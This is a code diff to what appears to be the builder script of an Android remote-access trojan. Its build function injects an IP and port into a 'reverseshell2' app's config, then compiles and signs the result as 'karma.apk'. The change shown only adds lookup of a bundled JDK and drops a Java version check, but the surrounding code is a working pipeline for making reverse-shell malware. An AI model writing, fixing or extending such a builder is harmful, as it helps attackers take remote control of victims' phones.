@@ -363,6 +363,17 @@ def connection_checker(socket,queue):
 
 
 def build(ip,port,output,ngrok=False,ng=None,icon=None):
+    # Resolve bundled JDK path so java doesn't need to be on system PATH
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    jdk_bin = os.path.join(script_dir, "jdk")
+    java_candidates = []
+    if os.path.isdir(jdk_bin):
+        for entry in os.listdir(jdk_bin):
+            candidate = os.path.join(jdk_bin, entry, "bin", "java.exe" if platform.system()=="Windows" else "java")
+            if os.path.isfile(candidate):
+                java_candidates.append(candidate)
+    java_bin = '"'+java_candidates[0]+'"' if java_candidates else "java"
+
     editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
     try:
         file = open(editor,"r").readlines()
@@ -375,14 +386,12 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     except Exception as e:
         print(e)
         sys.exit()
-    java_version = execute("java -version")
+    java_version = execute(java_bin+" -version")
     if java_version.returncode: print(stdOutput("error")+"Java not installed or found");exit()
-    #version_no = re.search(pattern, java_version.stderr).groups()[0]
-    # if float(version_no) > 1.8: print(stdOutput("error")+"Java 8 is required, Java version found "+version_no);exit()
     print(stdOutput("info")+"\033[0mGenerating APK")
     outFileName = output if output else "karma.apk"
     que = queue.Queue()
-    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
+    t = threading.Thread(target=executeCMD,args=[java_bin+" -jar jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
     t.start()
     while t.is_alive(): animate("Building APK ")
     t.join()
@@ -391,7 +400,7 @@ def build(ip,port,output,ngrok=False,ng=None,icon=None):
     if not resOut.returncode:
         print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
         print(stdOutput("info")+"\033[0mSigning the apk")
-        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
+        t = threading.Thread(target=executeCMD,args=[java_bin+" -jar jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
         t.start()
         while t.is_alive(): animate("Signing Apk ")
         t.join()
